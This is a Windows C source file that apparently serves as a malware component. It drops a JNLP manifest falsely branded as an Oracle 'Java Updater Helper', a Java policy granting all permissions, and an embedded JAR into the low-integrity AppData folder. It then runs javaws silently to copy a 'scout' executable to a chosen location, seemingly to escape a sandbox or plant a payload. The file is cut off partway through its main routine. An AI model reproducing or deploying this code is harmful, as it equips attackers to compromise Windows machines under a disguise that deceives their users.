#include <Windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>
#include <stdio.h>

#pragma warning(disable: 4996)
#pragma comment(lib, "shell32")
#pragma comment(lib, "shlwapi")

WCHAR JNLP1[] = L"<?xml version=\"1.0\" encoding=\"utf-8\"?>\
<jnlp codebase=\"file://localhost/";

WCHAR JNLP2[] = L"\" href=\"JUpdater.jnlp\">\
    <information>\
        <title>Java Updater Helper</title>\
        <vendor>Oracle Inc.</vendor>\
		<offline-allowed />\
    </information>\
    <resources>\
        <!-- Application Resources -->\
        <j2se version=\"1.6+\" href=\"http://java.sun.com/products/autodl/j2se\"/>\
        <jar download=\"lazy\" href=\"file://localhost/";

WCHAR JNLP3[] = L"\" />\
    </resources>\
    <applet-desc \
         name=\"Java Updater Helper\"\
         main-class=\"JUpdater\"\
         width=\"1\"\
         height=\"1\">\
		 <param name=\"srcFile\" value=\"";

WCHAR JNLP4[] = L"\"/>\
				 <param name=\"dstFile\" value=\"";

WCHAR JNLP5[] = L"\"/>\
				 <param name=\"jnlpFile\" value=\"";

WCHAR JNLP6[] = L"\"/>\
				 <param name=\"jarFile\" value=\"";

WCHAR JNLP7[] = L"\"/>\
				 <param name=\"polFile\" value=\"";

WCHAR JNLP8[] = L"\"/>\
		 </applet-desc>\
	  <update check=\"background\" policy=\"always\"/>\
	</jnlp>";

BYTE JavaPolicy[] = "grant { permission java.security.AllPermission; };";

BYTE JAR[1803] = {
	0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x08, 0x00, 0x08, 0x00, 0x85, 0x68, 0xE1, 0x42, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x04, 0x00, 0x4D, 0x45, 
	0x54, 0x41, 0x2D, 0x49, 0x4E, 0x46, 0x2F, 0xFE, 0xCA, 0x00, 0x00, 0x03, 0x00, 0x50, 0x4B, 0x07, 
	0x08, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x4B, 0x03, 
	0x04, 0x14, 0x00, 0x08, 0x00, 0x08, 0x00, 0x85, 0x68, 0xE1, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x4D, 0x45, 0x54, 0x41, 0x2D, 
	0x49, 0x4E, 0x46, 0x2F, 0x4D, 0x41, 0x4E, 0x49, 0x46, 0x45, 0x53, 0x54, 0x2E, 0x4D, 0x46, 0xF3, 
	0x4D, 0xCC, 0xCB, 0x4C, 0x4B, 0x2D, 0x2E, 0xD1, 0x0D, 0x4B, 0x2D, 0x2A, 0xCE, 0xCC, 0xCF, 0xB3, 
	0x52, 0x30, 0xD4, 0x33, 0xE0, 0xE5, 0x72, 0x2E, 0x4A, 0x4D, 0x2C, 0x49, 0x4D, 0xD1, 0x75, 0xAA, 
	0x04, 0x09, 0x98, 0xE9, 0x19, 0xC4, 0x1B, 0x9B, 0x2B, 0x68, 0x04, 0x97, 0xE6, 0x29, 0xF8, 0x66, 
	0x26, 0x17, 0xE5, 0x17, 0x57, 0x16, 0x97, 0xA4, 0xE6, 0x16, 0x2B, 0x78, 0xE6, 0x25, 0xEB, 0x69, 
	0xF2, 0x72, 0xF1, 0x72, 0x01, 0x00, 0x50, 0x4B, 0x07, 0x08, 0x0B, 0xB1, 0xFA, 0x9C, 0x47, 0x00, 
	0x00, 0x00, 0x47, 0x00, 0x00, 0x00, 0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x08, 0x00, 0x08, 0x00, 
	0x85, 0x68, 0xE1, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x0E, 0x00, 0x00, 0x00, 0x4A, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x72, 0x2E, 0x63, 0x6C, 0x61, 
	0x73, 0x73, 0xB5, 0x55, 0x4B, 0x70, 0x53, 0x55, 0x18, 0xFE, 0x4E, 0x72, 0x6F, 0x4E, 0x9A, 0xDE, 
	0x16, 0x08, 0x0D, 0x25, 0xBC, 0x0A, 0xF2, 0x4A, 0xD2, 0x96, 0x5A, 0xDE, 0xA4, 0x3C, 0xCB, 0x33, 
	0x35, 0x2D, 0xC5, 0x96, 0xD0, 0x87, 0x20, 0x69, 0x72, 0x5B, 0x52, 0xD2, 0x24, 0xE4, 0x41, 0x8B, 
	0x2B, 0x77, 0xEA, 0x8A, 0x8D, 0xA3, 0xE3, 0x42, 0x44, 0x67, 0x98, 0x32, 0xBA, 0x70, 0xCA, 0x60, 
	0xAB, 0xD6, 0x11, 0x57, 0x8C, 0xE3, 0xC6, 0xA5, 0x3B, 0x36, 0xCE, 0xB8, 0x73, 0xC6, 0x8D, 0x33, 
	0x32, 0xC3, 0x50, 0xBF, 0x73, 0x6F, 0x4A, 0x6F, 0xD1, 0xA5, 0x76, 0xD2, 0xFF, 0xFB, 0xFF, 0x73, 
	0xFE, 0xD7, 0xF9, 0xFF, 0xFF, 0x9C, 0xFB, 0xD3, 0xF3, 0x6F, 0xBF, 0x07, 0xB0, 0x1B, 0x6F, 0xF9, 
	0xB0, 0x0D, 0xC7, 0x6A, 0xB0, 0x15, 0xC7, 0x15, 0x39, 0xA1, 0x48, 0xA7, 0x22, 0x27, 0x15, 0x39, 
	0xE5, 0xC5, 0x76, 0x1F, 0xF1, 0xB4, 0x17, 0x3B, 0xBD, 0x08, 0x79, 0x11, 0xF6, 0x22, 0x22, 0x71, 
	0xC6, 0x87, 0x3A, 0x9C, 0xAD, 0xC1, 0x39, 0xC4, 0x7C, 0xE8, 0xC2, 0x6B, 0x4A, 0x25, 0x2E, 0xD1, 
	0xED, 0xE3, 0x4A, 0x8F, 0x1B, 0x78, 0x1B, 0x12, 0xE7, 0x25, 0x7A, 0x7D, 0x58, 0x83, 0x0B, 0x3E, 
	0x04, 0xF0, 0xBA, 0x44, 0x9F, 0x44, 0xBF, 0x0F, 0xEB, 0x70, 0xD1, 0x87, 0x20, 0x12, 0x3E, 0x5C, 
	0xC2, 0x80, 0x0F, 0x83, 0x18, 0x52, 0xDC, 0xB0, 0xE2, 0x86, 0x95, 0xD3, 0x37, 0x24, 0x2E, 0x4B, 
	0x5C, 0x91, 0x78, 0x53, 0x40, 0x96, 0x8A, 0xA9, 0x33, 0x99, 0xAC, 0x29, 0x50, 0x1F, 0x1F, 0x4F, 
	0xDE, 0x4C, 0xB6, 0x65, 0xF2, 0x6D, 0x4A, 0xEE, 0xE0, 0x56, 0xBA, 0x54, 0xB6, 0xB7, 0xBC, 0xE3, 
	0xB9, 0x6C, 0xC1, 0x66, 0xE5, 0x78, 0xB2, 0x58, 0xE5, 0x0A, 0xF9, 0xAC, 0xCD, 0x79, 0x0E, 0x67, 
	0x72, 0x99, 0xF2, 0x51, 0x01, 0x77, 0x28, 0x9C, 0x10, 0xD0, 0x4E, 0xE6, 0xD3, 0x5C, 0x5D, 0x11, 
	0xCF, 0xE4, 0xCC, 0x9E, 0xCA, 0xC4, 0x88, 0x59, 0xEC, 0x4F, 0x8E, 0x28, 0x3D, 0x4D, 0xA9, 0x09, 
	0xD4, 0xF5, 0x95, 0x93, 0xA9, 0xEB, 0xDD, 0xC9, 0x82, 0xB5, 0x6C, 0x25, 0x72, 0x95, 0xE7, 0x92, 
	0x48, 0xD2, 0x28, 0x95, 0x2F, 0xDC, 0xBA, 0x94, 0x29, 0x5F, 0xEB, 0x2B, 0x17, 0xCD, 0xE4, 0x44, 
	0x49, 0xA0, 0x29, 0xB4, 0x3C, 0xAF, 0xE5, 0x52, 0x38, 0xC1, 0x42, 0x49, 0x8C, 0x48, 0xA4, 0x24, 
	0xD2, 0x74, 0xC1, 0xA3, 0x09, 0xF8, 0xFA, 0xF2, 0x95, 0x62, 0xCA, 0xB4, 0xB3, 0xAB, 0xEB, 0xBA, 
	0x58, 0x48, 0x27, 0xCB, 0x66, 0x71, 0x97, 0xB2, 0x34, 0xD0, 0x8C, 0x16, 0x03, 0xDB, 0xB1, 0xC3, 
	0xC0, 0x4E, 0x45, 0x42, 0x8A, 0x84, 0x15, 0x89, 0x28, 0x62, 0x62, 0x54, 0xC0, 0x70, 0xC6, 0x50, 
	0x16, 0x63, 0x12, 0xD7, 0x0C, 0x64, 0x30, 0x2E, 0x71, 0xDD, 0x40, 0x16, 0x63, 0x06, 0xF6, 0x61, 
	0xBF, 0xC0, 0x6A, 0x4B, 0x31, 0x9B, 0xCC, 0x8D, 0xB5, 0x9D, 0x9E, 0x4A, 0x99, 0x85, 0x72, 0x26, 
	0x9F, 0x33, 0x30, 0x81, 0x9C, 0xC0, 0xFA, 0x45, 0x1F, 0x9D, 0x95, 0xD1, 0x51, 0xB3, 0x68, 0xA6, 
	0x63, 0xB9, 0x42, 0xA5, 0x6C, 0x1F, 0x4B, 0xA0, 0xD1, 0x19, 0xC1, 0xB1, 0xA3, 0x82, 0xE5, 0x15, 
	0x29, 0x08, 0x6C, 0x78, 0xD9, 0xC3, 0xF9, 0x4A, 0xD9, 0xE1, 0x62, 0xAD, 0xD3, 0x85, 0x73, 0x4B, 
	0x99, 0xDF, 0x50, 0xA4, 0xC8, 0xC2, 0x18, 0x28, 0xA1, 0xCC, 0xEA, 0x18, 0xA8, 0xE0, 0xA6, 0x81, 
	0x49, 0x75, 0xF8, 0x29, 0xDC, 0x5A, 0x4C, 0x9D, 0xE6, 0xB1, 0xF3, 0x2F, 0x52, 0x67, 0xA7, 0x17, 
	0x8B, 0x55, 0x55, 0x98, 0x6A, 0x2B, 0x4D, 0x66, 0x78, 0xBA, 0xAE, 0x13, 0x85, 0x42, 0xD6, 0x64, 
	0xF3, 0x56, 0x2E, 0x9D, 0x98, 0xD1, 0xB8, 0xB5, 0xAC, 0x08, 0xFD, 0xD7, 0x8A, 0xF9, 0x49, 0xBB, 
	0xD9, 0x4B, 0xFE, 0x9D, 0xE7, 0x6E, 0x58, 0x5C, 0x5D, 0x7E, 0x16, 0xD7, 0x70, 0x27, 0xAB, 0x3E, 
	0x66, 0x96, 0x7B, 0x93, 0xC5, 0xE4, 0x84, 0x69, 0xC5, 0xDF, 0x51, 0x6D, 0xBC, 0x23, 0x56, 0x47, 
	0xF8, 0x9F, 0x4B, 0x02, 0x81, 0x7F, 0x53, 0x4C, 0x2C, 0x4F, 0xF5, 0x56, 0xA9, 0x6C, 0x32, 0x8E, 
	0x3B, 0x5F, 0xE1, 0x19, 0x02, 0x2F, 0x66, 0xA8, 0x97, 0xCA, 0xD5, 0x24, 0x3A, 0x1C, 0x29, 0x3B, 
	0x96, 0xD5, 0x9C, 0x2B, 0x29, 0xCB, 0xE2, 0x68, 0xE6, 0x94, 0x9A, 0x5F, 0x2D, 0x14, 0x53, 0xEE, 
	0x57, 0x85, 0x5E, 0x1E, 0x45, 0xF6, 0x64, 0x69, 0xCD, 0x71, 0x6C, 0x6B, 0xCB, 0xFF, 0x92, 0xFA, 
	0x90, 0x5A, 0x0C, 0x2E, 0x2D, 0x3A, 0x0B, 0x62, 0x19, 0x68, 0xE4, 0xD2, 0x02, 0x7A, 0x68, 0xB8, 
	0x33, 0x1C, 0x23, 0x4E, 0x16, 0x33, 0x65, 0x75, 0xED, 0x28, 0xC7, 0xAC, 0x04, 0xF4, 0x54, 0x36, 
	0x5F, 0x52, 0xD7, 0x2F, 0x6D, 0xB2, 0x35, 0xA6, 0x75, 0xFD, 0x86, 0xB0, 0x85, 0xCF, 0xC4, 0x36, 
	0xBE, 0x3A, 0x3A, 0xFF, 0x39, 0xE5, 0x50, 0x7F, 0x3B, 0xAB, 0x18, 0xAA, 0x62, 0xB8, 0x8A, 0x11, 
	0x0B, 0xDD, 0x10, 0xEA, 0x52, 0x90, 0xB6, 0x52, 0xEA, 0x82, 0x8B, 0x1C, 0xB0, 0x29, 0x32, 0x07, 
	0x11, 0x11, 0x5F, 0xC1, 0xA5, 0x88, 0x5B, 0x11, 0x4D, 0x11, 0x5D, 0x11, 0xCF, 0x0C, 0x35, 0x04, 
	0x76, 0x91, 0xAE, 0x83, 0x87, 0xD4, 0x0B, 0x0D, 0x3E, 0xD4, 0xA0, 0x16, 0xF5, 0x30, 0xB0, 0x9A, 
	0x8F, 0xCC, 0x5A, 0x72, 0x02, 0x6D, 0x8B, 0x7E, 0xC5, 0x7B, 0xD4, 0xF0, 0x52, 0xF3, 0x41, 0xC4, 
	0x2F, 0x67, 0xE1, 0x8D, 0x47, 0xFC, 0x35, 0x84, 0xEE, 0x88, 0xDF, 0x47, 0xE8, 0x89, 0xF8, 0x6B, 
	0x09, 0x51, 0x2D, 0xE2, 0x37, 0x14, 0xEA, 0x91, 0x79, 0xD4, 0x0D, 0x36, 0xCF, 0xA1, 0x5E, 0xC5, 
	0x57, 0x7C, 0x8B, 0xC5, 0xBB, 0x2D, 0xBE, 0xD5, 0xE2, 0x35, 0x8B, 0x0F, 0x6A, 0x96, 0x60, 0x1B, 
	0x04, 0x75, 0x4B, 0xF0, 0x3C, 0xC0, 0x8A, 0xE6, 0x59, 0xAC, 0x24, 0xB4, 0xD8, 0xD0, 0x6A, 0x43, 
	0x50, 0xAB, 0xA2, 0x4E, 0x8C, 0x44, 0x1E, 0xD2, 0xF7, 0x43, 0xB8, 0xE7, 0xB0, 0x6A, 0x1A, 0x7A, 
	0xD4, 0xE3, 0xFE, 0x1A, 0xAB, 0xA7, 0xD1, 0x10, 0xB7, 0xD1, 0x88, 0x4A, 0xC5, 0x04, 0xE5, 0xA3, 
	0x19, 0xD6, 0xF2, 0x5D, 0xBC, 0x8F, 0x0F, 0xE1, 0x67, 0xFE, 0x1F, 0xE1, 0x6E, 0x15, 0xEF, 0x93, 
	0xDE, 0xC5, 0xA7, 0x16, 0xDE, 0xC7, 0xE7, 0x16, 0xBA, 0xAC, 0x9A, 0x8C, 0xF2, 0xF5, 0x05, 0x1A, 
	0xF8, 0x40, 0x07, 0x58, 0x85, 0x35, 0xA4, 0x8D, 0xD8, 0xC8, 0x8A, 0x6C, 0x67, 0xB5, 0xDA, 0xB1, 
	0x1E, 0x47, 0xB0, 0x01, 0x31, 0xAE, 0x24, 0xB0, 0x09, 0x29, 0x6C, 0xC6, 0x38, 0xBB, 0x76, 0x03, 
	0xAF, 0xF0, 0x62, 0x6E, 0xE5, 0xB3, 0xBE, 0x8D, 0xD1, 0xC2, 0x8C, 0xD7, 0xC6, 0x88, 0xCD, 0x8C, 
	0x73, 0x10, 0x1F, 0xE3, 0x10, 0x23, 0xB5, 0x33, 0xD6, 0x41, 0xDC, 0x23, 0x7F, 0x9F, 0x38, 0x83, 
	0x0E, 0xBC, 0xCA, 0x28, 0xED, 0xD0, 0x17, 0xA8, 0xE8, 0x91, 0x68, 0x97, 0xD8, 0xED, 0xFC, 0x41, 
	0x48, 0xEC, 0x59, 0x60, 0xF9, 0x89, 0xED, 0x50, 0xCF, 0xE4, 0x9E, 0xB3, 0x12, 0x7B, 0xBD, 0x4C, 
	0x92, 0x8F, 0x97, 0xDD, 0x16, 0xD7, 0x23, 0xB6, 0x8F, 0x6D, 0x11, 0x83, 0xA2, 0x47, 0x44, 0x35, 
	0x7F, 0xC3, 0x77, 0x2C, 0xFE, 0x3C, 0x02, 0x83, 0xF3, 0x58, 0xA3, 0xEA, 0xDF, 0x38, 0x87, 0xB5, 
	0x3D, 0xF3, 0x08, 0x52, 0x5E, 0x37, 0xD8, 0xC2, 0x52, 0xAD, 0x9F, 0xC3, 0x86, 0xA8, 0xE6, 0xDE, 
	0xEF, 0x09, 0x78, 0x5C, 0x9F, 0x60, 0x63, 0xAB, 0x2A, 0xE5, 0x46, 0x25, 0xDD, 0x59, 0xF8, 0x23, 
	0xA8, 0x05, 0x75, 0x77, 0xC0, 0x33, 0x8B, 0x4D, 0xD3, 0x0B, 0xBF, 0xB6, 0x3E, 0x86, 0x64, 0xD9, 
	0x9B, 0x82, 0xDA, 0x63, 0x78, 0x55, 0xE1, 0x37, 0xAB, 0x7A, 0x3F, 0x46, 0xAD, 0x82, 0x59, 0x6C, 
	0xB9, 0x44, 0xD4, 0x6C, 0x51, 0xAB, 0x8A, 0xFA, 0x72, 0xD1, 0xE3, 0x10, 0xED, 0x9E, 0xCC, 0x44, 
	0xF5, 0xFF, 0xC3, 0xED, 0x50, 0x54, 0xFE, 0xF7, 0x6E, 0x39, 0x38, 0x6A, 0xAA, 0x74, 0x35, 0x3D, 
	0x3A, 0x7A, 0xD9, 0x37, 0xBF, 0x85, 0xCF, 0xD8, 0xB3, 0x7B, 0x98, 0xB6, 0xF0, 0x19, 0x9E, 0x5B, 
	0xA8, 0x8B, 0x3E, 0x91, 0x60, 0xFF, 0xED, 0xE9, 0x79, 0x82, 0x03, 0xA4, 0xC7, 0x28, 0x1D, 0xA7, 
	0xC5, 0x19, 0xDE, 0xA9, 0xB3, 0x9C, 0x99, 0x73, 0x6C, 0x57, 0x8C, 0x1D, 0xEF, 0x62, 0xEB, 0xE2, 
	0x38, 0x8A, 0x6E, 0x9C, 0x44, 0x0F, 0xFD, 0x0D, 0xA0, 0x9F, 0xDF, 0xF5, 0x01, 0x0C, 0xE1, 0x32, 
	0x86, 0x31, 0x42, 0x9A, 0xC1, 0x15, 0x4E, 0xD3, 0x55, 0x4E, 0x53, 0x92, 0xD3, 0x94, 0xC2, 0x3B, 
	0x48, 0xE3, 0x36, 0x67, 0xF2, 0x03, 0x8C, 0xE1, 0x0E, 0x77, 0x3F, 0xE3, 0xBC, 0xDD, 0xC3, 0x05, 
	0xE6, 0x30, 0x80, 0x2F, 0x68, 0xFB, 0x25, 0x6D, 0x1F, 0xD2, 0xF6, 0x1B, 0xDA, 0xFE, 0x40, 0xDB, 
	0x1F, 0x69, 0xFB, 0x33, 0x6D, 0x7F, 0xA1, 0xED, 0x13, 0xDA, 0xFE, 0x46, 0xDB, 0xDF, 0x69, 0xFB, 
	0x27, 0x6D, 0x9F, 0xD2, 0xF6, 0x19, 0x06, 0x84, 0x0B, 0x83, 0xC2, 0x83, 0x21, 0x51, 0x8B, 0x61, 
	0xB1, 0x92, 0x9F, 0xDC, 0x46, 0x5C, 0x11, 0x4D, 0xB8, 0x2A, 0x76, 0xF0, 0x23, 0xBE, 0x0B, 0x29, 
	0xB1, 0x0F, 0x69, 0x71, 0x84, 0x9F, 0xD2, 0x53, 0x18, 0x13, 0x71, 0x64, 0x44, 0x1F, 0x3F, 0x68, 
	0x09, 0x64, 0xC5, 0x00, 0x33, 0x53, 0x53, 0x7B, 0x0E, 0xC1, 0x05, 0x32, 0xD2, 0x9A, 0xDA, 0x03, 
	0xD6, 0xEF, 0xA0, 0xC4, 0x21, 0x89, 0x28, 0xDF, 0x9E, 0xA7, 0x68, 0x92, 0x35, 0xF5, 0xFC, 0x53, 
	0x23, 0x5B, 0xB3, 0xC8, 0xED, 0x7D, 0xCE, 0xF7, 0x85, 0x57, 0xAA, 0xC3, 0x5A, 0xF8, 0x0B, 0x9E, 
	0x4E, 0x89, 0xC3, 0x1C, 0x6E, 0xDE, 0x26, 0x75, 0xEF, 0x8E, 0xFE, 0x0D, 0x50, 0x4B, 0x07, 0x08, 
	0xB4, 0xF4, 0x05, 0xB0, 0x3A, 0x05, 0x00, 0x00, 0x6E, 0x09, 0x00, 0x00, 0x50, 0x4B, 0x01, 0x02, 
	0x14, 0x00, 0x14, 0x00, 0x08, 0x00, 0x08, 0x00, 0x85, 0x68, 0xE1, 0x42, 0x00, 0x00, 0x00, 0x00, 
	0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x45, 0x54, 0x41, 0x2D, 0x49, 
	0x4E, 0x46, 0x2F, 0xFE, 0xCA, 0x00, 0x00, 0x50, 0x4B, 0x01, 0x02, 0x14, 0x00, 0x14, 0x00, 0x08, 
	0x00, 0x08, 0x00, 0x85, 0x68, 0xE1, 0x42, 0x0B, 0xB1, 0xFA, 0x9C, 0x47, 0x00, 0x00, 0x00, 0x47, 
	0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x3D, 0x00, 0x00, 0x00, 0x4D, 0x45, 0x54, 0x41, 0x2D, 0x49, 0x4E, 0x46, 0x2F, 0x4D, 0x41, 
	0x4E, 0x49, 0x46, 0x45, 0x53, 0x54, 0x2E, 0x4D, 0x46, 0x50, 0x4B, 0x01, 0x02, 0x14, 0x00, 0x14, 
	0x00, 0x08, 0x00, 0x08, 0x00, 0x85, 0x68, 0xE1, 0x42, 0xB4, 0xF4, 0x05, 0xB0, 0x3A, 0x05, 0x00, 
	0x00, 0x6E, 0x09, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0x00, 0x4A, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x72, 0x2E, 
	0x63, 0x6C, 0x61, 0x73, 0x73, 0x50, 0x4B, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x03, 
	0x00, 0xB9, 0x00, 0x00, 0x00, 0x3C, 0x06, 0x00, 0x00, 0x00, 0x00
};



LPWSTR GetLowIntegrityTemp()
{
	LPWSTR strTempPath = NULL;

	if (SHGetKnownFolderPath(FOLDERID_LocalAppDataLow, 0, NULL, &strTempPath) != S_OK)
		return NULL;

	LPWSTR strShortPath = (LPWSTR) VirtualAlloc(NULL, 0x8000 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	GetShortPathName(strTempPath, strShortPath, 0x8000);
	PathAddBackslash(strShortPath);
	
	return strShortPath;
}

LPWSTR GetFullPath(LPWSTR strFileName)
{
	LPWSTR strPath = GetLowIntegrityTemp();
	PathAppend(strPath, strFileName);
	return strPath;
}

LPWSTR GetJavaWSFullPath()
{
	HKEY hKey;
	LPWSTR strJavaKey = (LPWSTR) VirtualAlloc(NULL, 0x4000, MEM_COMMIT, PAGE_READWRITE);
	wcscat(strJavaKey, L"SOFTWARE\\JavaSoft\\Java Runtime Environment\\");

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, strJavaKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		DWORD strLen = 0x1000 * sizeof(WCHAR);
		LPWSTR strJavaWsVersion = (LPWSTR) VirtualAlloc(NULL, 0x1000 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
		if (RegQueryValueEx(hKey, L"CurrentVersion", NULL, NULL, (LPBYTE)strJavaWsVersion, &strLen) == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			wcscat(strJavaKey, strJavaWsVersion);

			if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, strJavaKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
			{
				strLen = 0x8000 * sizeof(WCHAR);
				LPWSTR strJavaWsFullPath = (LPWSTR) VirtualAlloc(NULL, 0x8000 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
				if (RegQueryValueEx(hKey, L"JavaHome", NULL, NULL, (LPBYTE)strJavaWsFullPath, &strLen) == ERROR_SUCCESS)
				{
					PathAppend(strJavaWsFullPath, L"bin\\javaws.exe");

					LPWSTR strJavaWSShortPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
					if (!GetShortPathName(strJavaWsFullPath, strJavaWSShortPath, 0x8000))
						return NULL;
					else
						return strJavaWSShortPath;
				}
			}
		}
	}

	return NULL;
}

#ifdef _DEBUG
int main()
{
	LPWSTR strTempScoutName = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	wcscat(strTempScoutName, L"c:\\windows\\syswow64\\calc.exe");
	LPWSTR strFinalScoutPath = (LPWSTR) VirtualAlloc(NULL, 0x8000*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	wcscat(strFinalScoutPath, L"c:\\users\\guido\\pippo.exe");
#elif _EXE
int main()
{
#else
#pragma comment(linker, "/EXPORT:qwopfnch=?qwopfnch@@YGHPAK@Z")
__declspec(dllexport) BOOL WINAPI qwopfnch(LPDWORD lpArgs)
{
	LPWSTR strTempScoutName = (LPWSTR) lpArgs[0];
	LPWSTR strFinalScoutPath = (LPWSTR) lpArgs[1];
#endif

	DWORD dwOut;
	HANDLE hFile;

	LPWSTR strJavaWSPath = GetJavaWSFullPath();
	if (!strJavaWSPath)
		return FALSE;

	LPWSTR strLowIntegrityTemp = GetLowIntegrityTemp();
	LPWSTR strJnlpFile = GetFullPath(L"JUpdater.jnlp");
	LPWSTR strJavaPolicyFile = GetFullPath(L"JUpdater.pol");
	LPWSTR strJarFile = GetFullPath(L"JUpdater.jar");

	// jnlp
	hFile = CreateFile(strJnlpFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, JNLP1, sizeof(JNLP1)-2, &dwOut, NULL);
	WriteFile(hFile, strLowIntegrityTemp, wcslen(strLowIntegrityTemp)*sizeof(WCHAR), &dwOut, NULL);
	WriteFile(hFile, JNLP2, sizeof(JNLP2)-2, &dwOut, NULL);
	WriteFile(hFile, strJarFile, wcslen(strJarFile)*sizeof(WCHAR), &dwOut, NULL);
	// srcFile
	WriteFile(hFile, JNLP3, sizeof(JNLP3)-2, &dwOut, NULL);
	WriteFile(hFile, strTempScoutName, wcslen(strTempScoutName)*sizeof(WCHAR), &dwOut, NULL);
	// dstFile
	WriteFile(hFile, JNLP4, sizeof(JNLP4)-2, &dwOut, NULL);
	WriteFile(hFile, strFinalScoutPath, wcslen(strFinalScoutPath)*sizeof(WCHAR), &dwOut, NULL);
	// jnlpFile
	WriteFile(hFile, JNLP5, sizeof(JNLP5)-2, &dwOut, NULL);
	WriteFile(hFile, strJnlpFile, wcslen(strJnlpFile)*sizeof(WCHAR), &dwOut, NULL);
	// jarFile
	WriteFile(hFile, JNLP6, sizeof(JNLP6)-2, &dwOut, NULL);
	WriteFile(hFile, strJarFile, wcslen(strJarFile)*sizeof(WCHAR), &dwOut, NULL);
	// polFile
	WriteFile(hFile, JNLP7, sizeof(JNLP7)-2, &dwOut, NULL);
	WriteFile(hFile, strJavaPolicyFile, wcslen(strJavaPolicyFile)*sizeof(WCHAR), &dwOut, NULL);
	WriteFile(hFile, JNLP8, sizeof(JNLP8)-2, &dwOut, NULL);


	CloseHandle(hFile);


	// java policy
	hFile = CreateFile(strJavaPolicyFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, JavaPolicy, strlen((LPSTR)JavaPolicy), &dwOut, NULL);
	CloseHandle(hFile);
												  
	// jar
	hFile = CreateFile(strJarFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, JAR, sizeof(JAR), &dwOut, NULL);
	CloseHandle(hFile);


	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPWSTR strCmdLine = (LPWSTR) VirtualAlloc(NULL, (0x8000*2)*sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);
	
	SecureZeroMemory(strCmdLine, (0x8000*2)*sizeof(WCHAR));
	wcscat(strCmdLine, L"\""); wcscat(strCmdLine, strJavaWSPath); wcscat(strCmdLine, L"\"");
	wcscat(strCmdLine, L" -uninstall "); 
	wcscat(strCmdLine, L"\"");	wcscat(strCmdLine, strJnlpFile); wcscat(strCmdLine, L"\"");

	// clean-up	
	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	CreateProcess(strJavaWSPath, strCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	
	
	// javaws -Xnosplash -import  $jnlp -silent
	SecureZeroMemory(strCmdLine, (0x8000*2)*sizeof(WCHAR));
	wcscat(strCmdLine, L"\""); wcscat(strCmdLine, strJavaWSPath); wcscat(strCmdLine, L"\"");
	wcscat(strCmdLine, L" -Xnosplash");
	wcscat(strCmdLine, L" -import");
	wcscat(strCmdLine, L" \""); wcscat(strCmdLine, strJnlpFile); wcscat(strCmdLine, L"\"");
	wcscat(strCmdLine, L" -silent");

	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	CreateProcess(strJavaWSPath, strCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	

	// start JavaWS
	SecureZeroMemory(strCmdLine, (0x8000*2)*sizeof(WCHAR));
	wcscat(strCmdLine, L"\""); wcscat(strCmdLine, strJavaWSPath); wcscat(strCmdLine, L"\"");
	wcscat(strCmdLine, L" -Xnosplash");
	wcscat(strCmdLine, L" -offline");
	//wcscat(strCmdLine, L" -J-DsrcFile=\""); wcscat(strCmdLine, strTempScoutName); wcscat(strCmdLine, L"\"");
	//wcscat(strCmdLine, L" -J-DdstFile=\""); wcscat(strCmdLine, strFinalScoutPath); wcscat(strCmdLine, L"\"");
